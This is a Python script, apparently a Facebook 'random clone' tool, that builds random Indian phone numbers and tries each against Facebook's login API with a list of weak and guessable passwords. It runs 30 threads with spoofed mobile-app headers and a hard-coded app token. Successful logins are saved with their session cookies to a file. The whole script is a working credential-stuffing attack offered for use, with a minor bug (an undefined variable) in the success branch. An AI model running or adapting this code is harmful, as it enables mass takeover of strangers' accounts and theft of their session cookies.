#------import------#
import os,re,time,sys,requests,json,uuid
import random
import string
from concurrent.futures import ThreadPoolExecutor as tred
#--------loop--------#
loop=0
oks=[]
cps=[]

#-----logo------#

logo =(f"""\033[1;36m
   ____               _  _____  _ __       
  / __/__  ___  __ __| |/_/ _ \(_) /  __ __
 _\ \/ _ \/ _ \/ // />  </ ___/ / _ \/ // /
/___/\___/_//_/\_,_/_/|_/_/  /_/_//_/\_,_/                                            
[+]====================================
[+] CREATED BY   :  SONU
[+] ON GITHUB    :  SONU-CRTR
[+] TOOL STATUS  :  RANDOM
[+] TOOL VIRSION :  0.2
[+]====================================""")
#----clear------#
def clr():
   os.system("clear")
   print(logo)
#-------LINEX-------#
def linex():
     print("---------------------------------------")
#Main-Def-#
def Main():
   clr()
   print("(+)-[1] INDIA RANDOM CLONE")
   print("(+)-[2] Exit ")
   linex()
   op=input("(?) Choice : ")
   if op in ["01","1"]:
      Random()
   elif op=="0":
         exit()
def Random():
    clr()
    print("(+) Example : 8958,7900,9897,")
    linex()
    code = input("(+) Choice : ")
    clr()
    print("(+) Example : 5000,10000,20000")
    linex()
    try:
        limit = int(input("(+) Choice Limit : "))
    except ValueError:
        limit = 50000

    clr()
    user = []
    for _ in range(limit):
        nmp = "".join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)

    with tred(max_workers=30) as sonu:
        clr()
        tl = str(len(user))
        print(f"(+) Total UID : {tl}")
        print(f"(+) Sim Code : {code}")
        print("(+) Use Airplane Mode")
        linex()

        for love in user:
            ids = code + love
            passlist = [love, ids, ids[:7], ids[:6], ids[:5], ids[:4],
                        '57273200', '59039200', '57575751']
            sonu.submit(M1, ids, passlist)

    print(" ")
    print("(+) Cloning Complete")
    print("(+) Ok Id : " + str(len(oks)))
    print("(+) Cp Id : " + str(len(cps)))
    linex()
    exit()
#Global variables initialization
loop = 0
oks = []
cps = []

def M1(ids, passlist):
    global loop, oks, cps
    try:
        sys.stdout.write('\r\r\033[1;32m [Sonuxpihu] %s|\033[1;32mOK:%s|\033[1;91mCP:%s \r'%(loop,len(oks),len(cps)));sys.stdout.flush()

        for pas in passlist:
            access_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'

            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'email': ids,
                'password': pas,
                'generate_analytics_claims': '1',
                'community_id': '',
                'cpl': 'true',
                'try_num': '1',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'password',
                'source': 'login',
                'error_detail_type': 'button_with_disabled',
                'enroll_misauth': 'false',
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'fb_api_req_friendly_name': 'authenticate',
                'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
                'access_token': access_token
            }

            headers = {
                'User-Agent': '[FBAN/Orca-Android;FBAV/248.0.0.7.127;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/194293860;FBCR/PLAY;FBMF/LGE;FBBD/lge;FBDV/LG-M250;FBSV/7.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1193};FB_FW/1;] FBBK/1',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'Keep-Alive',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                'Authorization': f'OAuth {access_token}',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': access_token
            }

            url = 'https://graph.facebook.com/auth/login'

            try:
                response = requests.post(url, data=data, headers=headers)
                po = response.json()
            except Exception as e:
                pass
                continue

            if 'session_key' in po:
                uid = str(q['uid'])
                coki = ";".join(i['name'] + '=' + i['value'] for i in po.get('session_cookies', []))
                print(f'\r\r\x1b[38;5;46m[OX-OK] {str(uid)} | {pas} ')
                print(f'\r\r\x1b[38;5;46m[COOKIE] > {coki} ')
                with open('/sdcard/RNDM-OK.txt', 'a') as okfile:
                    okfile.write(f"{uid}|{pas}|{coki}\n")
                oks.append(str(uid))
                break

            elif 'www.facebook.com' in po.get('error', {}).get('message', ''):
                uid = po['error']['error_data'].get('uid', uid)
                print(f'\r\r\033[1;91m[OX-CP] {str(uid)} | {pas} ')
                with open('/sdcard/RNDM-CP.txt', 'a') as cpfile:
                    cpfile.write(f"{uid}|{pas}\n")
                cps.append(str(uid))
                break

        loop += 1

    except Exception as e:
        pass
        
        
Main()
